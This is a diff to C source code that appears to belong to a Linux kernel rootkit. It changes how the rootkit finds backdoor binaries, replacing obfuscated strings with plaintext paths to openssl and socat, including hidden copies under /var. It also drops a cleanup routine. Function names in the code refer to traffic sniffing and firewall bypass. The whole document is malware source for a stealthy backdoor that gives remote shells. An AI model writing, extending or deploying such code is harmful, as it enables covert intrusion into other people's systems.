@@ -59,37 +59,22 @@ struct stat_ops_t {
 static struct stat_ops_t stat_ops[BD_OPS_SIZE];
 
 static void _load_stat_ops(void) {
-
+    //XXX: use environment
     stat_ops[0].kv_port = RR_OPENSSL;
-    stat_ops[0].bin[0] = kv_whatever_copystr(_OBF_USR_BIN_OPENSSL,
-            sizeof(_OBF_USR_BIN_OPENSSL));
-    stat_ops[0].bin[1] = kv_whatever_copystr(_OBF_BIN_OPENSSL,
-            sizeof(_OBF_BIN_OPENSSL));
-    stat_ops[0].bin[2] = kv_whatever_copystr(_OBF_VAR_OPENSSL,
-            sizeof(_OBF_VAR_OPENSSL));
+    stat_ops[0].bin[0] = "/usr/bin/openssl";
+    stat_ops[0].bin[1] = "/bin/openssl";
+    stat_ops[0].bin[2] = "/var/.openssl";
 
-    /** RR_SOCAT_TTY is the same */
     stat_ops[1].kv_port = RR_SOCAT;
-    stat_ops[1].bin[0] = kv_whatever_copystr(_OBF_USR_BIN_SOCAT,
-            sizeof(_OBF_USR_BIN_SOCAT));
-    stat_ops[1].bin[1] = kv_whatever_copystr(_OBF_BIN_SOCAT,
-            sizeof(_OBF_BIN_SOCAT));
-    stat_ops[1].bin[2] = kv_whatever_copystr(_OBF_VAR_SOCAT,
-            sizeof(_OBF_VAR_SOCAT));
-}
-static void _unload_stat_ops(void) {
-    int i;
-    for (i = 0; i < BD_OPS_SIZE; ++i) {
-        int x;
-        for (x = 0; x < BD_PATH_NUM; ++x) {
-            kv_mem_free(&(stat_ops[i].bin[x]));
-        }
-    }
+    stat_ops[1].bin[0] = "/usr/bin/socat";
+    stat_ops[1].bin[1] = "/bin/socat";
+    stat_ops[1].bin[2] = "/var/.socat";
 }
 
 /**
  * Iterate over stat_ops list and query FS
  * whether the binary is available
+ * XXX: use environment
  */
 static const char *_locate_bdbin(int port) {
     int i, x;
@@ -679,7 +664,6 @@ void kv_sock_stop_sniff(struct task_struct *tsk) {
     _free_kfifo_items();
 
     kfifo_free(&buffer);
-    _unload_stat_ops();
 }
 
 void kv_sock_stop_fw_bypass(void) {
